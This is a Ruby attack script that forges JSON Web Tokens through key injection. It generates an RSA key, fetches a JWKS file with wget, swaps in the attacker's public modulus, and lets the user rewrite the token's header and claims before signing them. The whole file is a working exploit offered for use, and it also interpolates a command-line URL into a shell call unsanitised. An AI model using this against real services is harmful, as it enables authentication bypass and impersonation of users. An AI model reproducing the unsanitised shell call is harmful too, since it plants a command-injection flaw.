require "openssl"
require "base64"
require "json"


def check_for_private_rsa_file
    if(!File.exist?('private.pem'))
        system("openssl genrsa -out private.pem 2048")
        puts "[+] Generating private RSA key."
    end
end


def create_header(decoded_header)
    puts "\n========================================================================="
    puts "Decoded Header: %s" %decoded_header
    puts "\n========================================================================="
    puts "\nEdit Header: "
    customHeader = gets
    return customHeader
end


def create_payload(decoded_payload)
    puts "\n========================================================================="
    puts "Decoded Payload: %s" %decoded_payload
    puts "==========================================================================="
    puts "\nEdit Payload:"
    customPayload = gets
    return customPayload
end


def create_keys
    priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
    pub = priv.public_key
    n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
    e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")
    return n, e, priv
end


def update_jwk_file(n)
    begin
        jwks_file = File.read('./jwks.json')
    rescue
        puts "You need a jwk.json file to perform this exploit. File does not exist."
        exit
    end
    data_hash = JSON.parse(jwks_file)
    data_hash["keys"][0]["n"] = n
    File.write("./jwks.json", JSON.dump(data_hash))
end


def gen_new_token(generateNewToken, customHeader, customPayload, priv)
    if generateNewToken == "--new-token" 
        token = Base64.urlsafe_encode64(customHeader).gsub(/=+$/,"")
        token+= "."+Base64.urlsafe_encode64(customPayload).gsub(/=+$/,"")
        signature = priv.sign("SHA256", token)
        token+= "."+Base64.urlsafe_encode64(signature).gsub(/=+$/,"")
        return token
    end
end


def main
    check_for_private_rsa_file
    originalToken = ARGV[0]
    generateNewToken = ARGV[1]
    jwk_file_cli_arg, jwk_file_url = ARGV[2], ARGV[3]
    token_arr = originalToken.split('.')
    originalToken = ARGV.clear
    if jwk_file_cli_arg == "--jwk-file"
        system("wget #{jwk_file_url}")
    end
    header, payload = token_arr[0], token_arr[1]
    decoded_header = Base64.decode64(header)
    decoded_payload = Base64.decode64(payload)
    custom_header = create_header decoded_header
    custom_payload = create_payload decoded_payload
    n_key, e_key, priv = create_keys
    update_jwk_file n_key
    new_token = gen_new_token generateNewToken, custom_header, custom_payload, priv
    puts "\n[+] New JWT Token:\n#{new_token}"
end


main